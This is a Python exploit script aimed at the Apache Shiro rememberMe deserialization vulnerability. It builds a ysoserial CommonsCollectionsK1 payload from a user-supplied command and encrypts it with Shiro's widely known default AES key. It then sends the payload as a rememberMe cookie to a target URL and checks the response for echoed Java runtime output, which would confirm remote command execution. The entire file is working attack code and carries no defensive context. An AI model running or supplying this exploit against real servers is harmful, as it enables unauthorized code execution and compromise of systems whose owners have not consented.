import sys
import base64
import requests
import uuid
from random import Random
import subprocess
from Crypto.Cipher import AES
 
def generator(command,key):
    popen = subprocess.Popen(['java', '-jar', 'yso.jar', 'CommonsCollectionsK1', command], stdout=subprocess.PIPE)
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

def checlvul(codefile,target):
    key  =  "kPH+bIxk5D2deZiIxcaaaA=="
    payload = generator(codefile,key)
    proxies = {"http": "http://127.0.0.1:8080",}
    headers={"User-agent" : "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.14; rv:85.0) Gecko/20100101 Firefox/85.0;","echo":"1",}
    r = requests.get(target, cookies={'rememberMe': payload.decode()},headers=headers, timeout=20,proxies=proxies)
    if r.status_code ==200 and b"java.runtime.name" in r.text:
    	print("rememberMe={}".format(payload.decode()))

if __name__ == '__main__':
    codefile = sys.argv[1]
    target = sys.argv[2]
    checlvul(codefile,target)
